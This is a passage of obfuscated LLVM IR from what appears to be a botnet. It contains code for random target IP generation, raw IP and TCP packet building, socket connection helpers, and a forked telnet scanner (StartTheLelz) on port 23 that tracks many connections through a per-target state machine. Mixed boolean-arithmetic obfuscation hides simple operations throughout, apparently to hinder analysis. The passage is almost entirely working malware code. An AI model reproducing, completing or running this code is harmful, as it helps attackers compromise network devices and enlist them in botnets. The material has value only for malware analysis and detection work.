  %281 = call i32 (i8*, i8*, ...) @sprintf(i8* %268, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.311, i32 0, i32 0), i32 %271, i32 %274, i32 %277, i32 %280) #2
  %282 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %283 = call i32 @inet_addr(i8* %282) #2
  ret i32 %283
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %22

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i32
  %14 = load i32, i32* %5, align 4
  %15 = sub i32 0, %13
  %16 = sub i32 %14, %15
  %17 = add nsw i32 %14, %13
  store i32 %16, i32* %5, align 4
  %18 = load i32, i32* %4, align 4
  %19 = sub i32 0, 2
  %20 = add i32 %18, %19
  %21 = sub nsw i32 %18, 2
  store i32 %20, i32* %4, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  %23 = load i32, i32* %4, align 4
  %24 = icmp sgt i32 %23, 0
  br i1 %24, label %25, label %35

; <label>:25:                                     ; preds = %22
  %26 = load i16*, i16** %3, align 8
  %27 = bitcast i16* %26 to i8*
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = load i32, i32* %5, align 4
  %31 = sub i32 %30, 2021089783
  %32 = add i32 %31, %29
  %33 = add i32 %32, 2021089783
  %34 = add nsw i32 %30, %29
  store i32 %33, i32* %5, align 4
  br label %35

; <label>:35:                                     ; preds = %25, %22
  br label %36

; <label>:36:                                     ; preds = %40, %35
  %37 = load i32, i32* %5, align 4
  %38 = ashr i32 %37, 16
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %57

; <label>:40:                                     ; preds = %36
  %41 = load i32, i32* %5, align 4
  %42 = xor i32 %41, -1
  %43 = xor i32 65535, -1
  %44 = xor i32 -699840354, -1
  %45 = or i32 %42, %43
  %46 = or i32 -699840354, %44
  %47 = xor i32 %45, -1
  %48 = and i32 %47, %46
  %49 = and i32 %41, 65535
  %50 = load i32, i32* %5, align 4
  %51 = ashr i32 %50, 16
  %52 = sub i32 0, %48
  %53 = sub i32 0, %51
  %54 = add i32 %52, %53
  %55 = sub i32 0, %54
  %56 = add nsw i32 %48, %51
  store i32 %55, i32* %5, align 4
  br label %36

; <label>:57:                                     ; preds = %36
  %58 = load i32, i32* %5, align 4
  %59 = xor i32 %58, -1
  %60 = and i32 -1940537113, %59
  %61 = xor i32 -1940537113, -1
  %62 = and i32 %58, %61
  %63 = xor i32 -1, -1
  %64 = and i32 %63, -1940537113
  %65 = and i32 -1, %61
  %66 = or i32 %60, %62
  %67 = or i32 %64, %65
  %68 = xor i32 %66, %67
  %69 = xor i32 %58, -1
  %70 = trunc i32 %68 to i16
  ret i16 %70
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 %13, -1
  %15 = xor i8 -16, -1
  %16 = xor i8 94, -1
  %17 = or i8 %14, %15
  %18 = or i8 94, %16
  %19 = xor i8 %17, -1
  %20 = and i8 %19, %18
  %21 = and i8 %13, -16
  %22 = and i8 %20, 5
  %23 = xor i8 %20, 5
  %24 = or i8 %22, %23
  %25 = or i8 %20, 5
  store i8 %24, i8* %12, align 4
  %26 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %27 = bitcast %struct.iphdr* %26 to i8*
  %28 = load i8, i8* %27, align 4
  %29 = xor i8 %28, -1
  %30 = xor i8 15, -1
  %31 = xor i8 -47, -1
  %32 = or i8 %29, %30
  %33 = or i8 -47, %31
  %34 = xor i8 %32, -1
  %35 = and i8 %34, %33
  %36 = and i8 %28, 15
  %37 = xor i8 %35, -1
  %38 = xor i8 64, -1
  %39 = xor i8 68, -1
  %40 = and i8 %37, 68
  %41 = and i8 %35, %39
  %42 = and i8 %38, 68
  %43 = and i8 64, %39
  %44 = or i8 %40, %41
  %45 = or i8 %42, %43
  %46 = xor i8 %44, %45
  %47 = or i8 %37, %38
  %48 = xor i8 %47, -1
  %49 = or i8 68, %39
  %50 = and i8 %48, %49
  %51 = or i8 %46, %50
  %52 = or i8 %35, 64
  store i8 %51, i8* %27, align 4
  %53 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 1
  store i8 0, i8* %54, align 1
  %55 = load i32, i32* %10, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 20, 5262812971614131203
  %58 = add i64 %57, %56
  %59 = add i64 %58, 5262812971614131203
  %60 = add i64 20, %56
  %61 = trunc i64 %59 to i16
  %62 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %63 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %62, i32 0, i32 2
  store i16 %61, i16* %63, align 2
  %64 = call i32 @rand_cmwc()
  %65 = trunc i32 %64 to i16
  %66 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 3
  store i16 %65, i16* %67, align 4
  %68 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 4
  store i16 0, i16* %69, align 2
  %70 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %71 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %70, i32 0, i32 5
  store i8 -1, i8* %71, align 4
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %74 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %73, i32 0, i32 6
  store i8 %72, i8* %74, align 1
  %75 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %76 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %75, i32 0, i32 7
  store i16 0, i16* %76, align 2
  %77 = load i32, i32* %8, align 4
  %78 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %79 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %78, i32 0, i32 8
  store i32 %77, i32* %79, align 4
  %80 = load i32, i32* %7, align 4
  %81 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %82 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %81, i32 0, i32 9
  store i32 %80, i32* %82, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i8* @mygethostbyname(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.addrinfo, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca %struct.addrinfo*, align 8
  %8 = alloca %struct.sockaddr_in*, align 8
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %5, i32 0, i32 1
  store i32 2, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %5, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = load i8*, i8** %3, align 8
  %14 = call i32 @getaddrinfo(i8* %13, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.312, i32 0, i32 0), %struct.addrinfo* %5, %struct.addrinfo** %6)
  store i32 %14, i32* %9, align 4
  %15 = icmp ne i32 %14, 0
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %1
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %2, align 8
  br label %38

; <label>:17:                                     ; preds = %1
  %18 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  store %struct.addrinfo* %18, %struct.addrinfo** %7, align 8
  br label %19

; <label>:19:                                     ; preds = %32, %17
  %20 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %21 = icmp ne %struct.addrinfo* %20, null
  br i1 %21, label %22, label %36

; <label>:22:                                     ; preds = %19
  %23 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %24 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %23, i32 0, i32 5
  %25 = load %struct.sockaddr*, %struct.sockaddr** %24, align 8
  %26 = bitcast %struct.sockaddr* %25 to %struct.sockaddr_in*
  store %struct.sockaddr_in* %26, %struct.sockaddr_in** %8, align 8
  %27 = load %struct.sockaddr_in*, %struct.sockaddr_in** %8, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  %30 = load i32, i32* %29, align 4
  %31 = call i8* @inet_ntoa(i32 %30) #2
  store i8* %31, i8** %2, align 8
  br label %38
                                                  ; No predecessors!
  %33 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %34 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %33, i32 0, i32 7
  %35 = load %struct.addrinfo*, %struct.addrinfo** %34, align 8
  store %struct.addrinfo* %35, %struct.addrinfo** %7, align 8
  br label %19

; <label>:36:                                     ; preds = %19
  %37 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  call void @freeaddrinfo(%struct.addrinfo* %37) #2
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %2, align 8
  br label %38

; <label>:38:                                     ; preds = %36, %22, %16
  %39 = load i8*, i8** %2, align 8
  ret i8* %39
}

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %11 = load i8*, i8** %4, align 8
  %12 = call i8* @mygethostbyname(i8* %11)
  %13 = bitcast i8* %12 to %struct.hostent*
  store %struct.hostent* %13, %struct.hostent** %6, align 8
  %14 = icmp eq %struct.hostent* %13, null
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %50

; <label>:16:                                     ; preds = %2
  %17 = load %struct.hostent*, %struct.hostent** %6, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %6, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #2
  %28 = load i16, i16* %5, align 2
  %29 = call zeroext i16 @htons(i16 zeroext %28) #13
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %31, align 4
  %32 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %32, i32* %9, align 4
  %33 = load i32, i32* %9, align 4
  %34 = bitcast i32* %8 to i8*
  %35 = call i32 @setsockopt(i32 %33, i32 6, i32 1, i8* %34, i32 4) #2
  %36 = load i32, i32* %9, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %16
  store i32 0, i32* %3, align 4
  br label %50

; <label>:39:                                     ; preds = %16
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %42 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %42, %struct.sockaddr** %41, align 8
  %43 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %44 = load %struct.sockaddr*, %struct.sockaddr** %43, align 8
  %45 = call i32 @connect(i32 %40, %struct.sockaddr* %44, i32 16)
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %39
  store i32 0, i32* %3, align 4
  br label %50

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %9, align 4
  store i32 %49, i32* %3, align 4
  br label %50

; <label>:50:                                     ; preds = %48, %47, %38, %15
  %51 = load i32, i32* %3, align 4
  ret i32 %51
}

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %24 = call i32 @fork() #2
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

; <label>:26:                                     ; preds = %2
  ret void

; <label>:27:                                     ; preds = %2
  %28 = load i32, i32* %4, align 4
  store i32 %28, i32* %11, align 4
  %29 = call i64 @time(i64* null) #2
  %30 = call i32 @rand_cmwc()
  %31 = zext i32 %30 to i64
  %32 = xor i64 %29, -1
  %33 = and i64 %31, %32
  %34 = xor i64 %31, -1
  %35 = and i64 %29, %34
  %36 = or i64 %33, %35
  %37 = xor i64 %29, %31
  %38 = trunc i64 %36 to i32
  call void @srand(i32 %38) #2
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %39, align 4
  %40 = call zeroext i16 @htons(i16 zeroext 23) #13
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %43 = getelementptr inbounds [8 x i8], [8 x i8]* %42, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 8, i32 4, i1 false)
  %44 = call noalias i8* @malloc(i64 1025) #2
  store i8* %44, i8** %17, align 8
  %45 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 1025, i32 1, i1 false)
  %46 = load i32, i32* %11, align 4
  %47 = zext i32 %46 to i64
  %48 = call i8* @llvm.stacksave()
  store i8* %48, i8** %19, align 8
  %49 = alloca %struct.telstate_t, i64 %47, align 16
  %50 = bitcast %struct.telstate_t* %49 to i8*
  %51 = load i32, i32* %11, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 5
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %54

; <label>:54:                                     ; preds = %72, %27
  %55 = load i32, i32* %5, align 4
  %56 = load i32, i32* %11, align 4
  %57 = icmp slt i32 %55, %56
  br i1 %57, label %58, label %79

; <label>:58:                                     ; preds = %54
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %60
  %62 = bitcast %struct.telstate_t* %61 to i8*
  call void @llvm.memset.p0i8.i64(i8* %62, i8 0, i64 32, i32 16, i1 false)
  %63 = load i32, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 3
  store i8 1, i8* %66, align 1
  %67 = load i8*, i8** %17, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %69
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %70, i32 0, i32 9
  store i8* %67, i8** %71, align 8
  br label %72

; <label>:72:                                     ; preds = %58
  %73 = load i32, i32* %5, align 4
  %74 = sub i32 0, %73
  %75 = sub i32 0, 1
  %76 = add i32 %74, %75
  %77 = sub i32 0, %76
  %78 = add nsw i32 %73, 1
  store i32 %77, i32* %5, align 4
  br label %54

; <label>:79:                                     ; preds = %54
  br label %80

; <label>:80:                                     ; preds = %917, %79
  br label %81

; <label>:81:                                     ; preds = %80
  store i32 0, i32* %5, align 4
  br label %82

; <label>:82:                                     ; preds = %911, %81
  %83 = load i32, i32* %5, align 4
  %84 = load i32, i32* %11, align 4
  %85 = icmp slt i32 %83, %84
  br i1 %85, label %86, label %917

; <label>:86:                                     ; preds = %82
  %87 = load i32, i32* %5, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %88
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %89, i32 0, i32 7
  %91 = load i32, i32* %90, align 16
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %93, label %100

; <label>:93:                                     ; preds = %86
  %94 = call i64 @time(i64* null) #2
  %95 = trunc i64 %94 to i32
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 7
  store i32 %95, i32* %99, align 16
  br label %100

; <label>:100:                                    ; preds = %93, %86
  %101 = load i32, i32* %5, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %102
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 8
  %106 = zext i8 %105 to i32
  switch i32 %106, label %910 [
    i32 0, label %107
    i32 1, label %266
    i32 2, label %377
    i32 3, label %426
    i32 4, label %471
    i32 5, label %520
    i32 6, label %565
    i32 7, label %669
  ]

; <label>:107:                                    ; preds = %100
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %109
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %110, i32 0, i32 3
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 1
  br i1 %114, label %115, label %135

; <label>:115:                                    ; preds = %107
  %116 = load i32, i32* %5, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 9
  %120 = load i8*, i8** %119, align 8
  store i8* %120, i8** %20, align 8
  %121 = load i32, i32* %5, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %122
  %124 = bitcast %struct.telstate_t* %123 to i8*
  call void @llvm.memset.p0i8.i64(i8* %124, i8 0, i64 32, i32 16, i1 false)
  %125 = load i8*, i8** %20, align 8
  %126 = load i32, i32* %5, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 9
  store i8* %125, i8** %129, align 8
  %130 = call i32 @getDatIP()
  %131 = load i32, i32* %5, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 1
  store i32 %130, i32* %134, align 4
  br label %188

; <label>:135:                                    ; preds = %107
  %136 = load i32, i32* %5, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 3
  %140 = load i8, i8* %139, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %143, label %187

; <label>:143:                                    ; preds = %135
  %144 = load i32, i32* %5, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %145
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %146, i32 0, i32 5
  %148 = load i8, i8* %147, align 1
  %149 = sub i8 %148, -117
  %150 = add i8 %149, 1
  %151 = add i8 %150, -117
  %152 = add i8 %148, 1
  store i8 %151, i8* %147, align 1
  %153 = load i32, i32* %5, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %155, i32 0, i32 4
  %157 = load i8, i8* %156, align 2
  %158 = sub i8 0, 1
  %159 = sub i8 %157, %158
  %160 = add i8 %157, 1
  store i8 %159, i8* %156, align 2
  %161 = load i32, i32* %5, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 5
  %165 = load i8, i8* %164, align 1
  %166 = zext i8 %165 to i64
  %167 = icmp eq i64 %166, 98
  br i1 %167, label %168, label %173

; <label>:168:                                    ; preds = %143
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 3
  store i8 1, i8* %172, align 1
  br label %911

; <label>:173:                                    ; preds = %143
  %174 = load i32, i32* %5, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %175
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %176, i32 0, i32 4
  %178 = load i8, i8* %177, align 2
  %179 = zext i8 %178 to i64
  %180 = icmp eq i64 %179, 99
  br i1 %180, label %181, label %186

; <label>:181:                                    ; preds = %173
  %182 = load i32, i32* %5, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %183
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %184, i32 0, i32 3
  store i8 1, i8* %185, align 1
  br label %911

; <label>:186:                                    ; preds = %173
  br label %187

; <label>:187:                                    ; preds = %186, %135
  br label %188

; <label>:188:                                    ; preds = %187, %115
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %189, align 4
  %190 = call zeroext i16 @htons(i16 zeroext 23) #13
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %190, i16* %191, align 2
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %193 = getelementptr inbounds [8 x i8], [8 x i8]* %192, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %193, i8 0, i64 8, i32 4, i1 false)
  %194 = load i32, i32* %5, align 4
  %195 = sext i32 %194 to i64
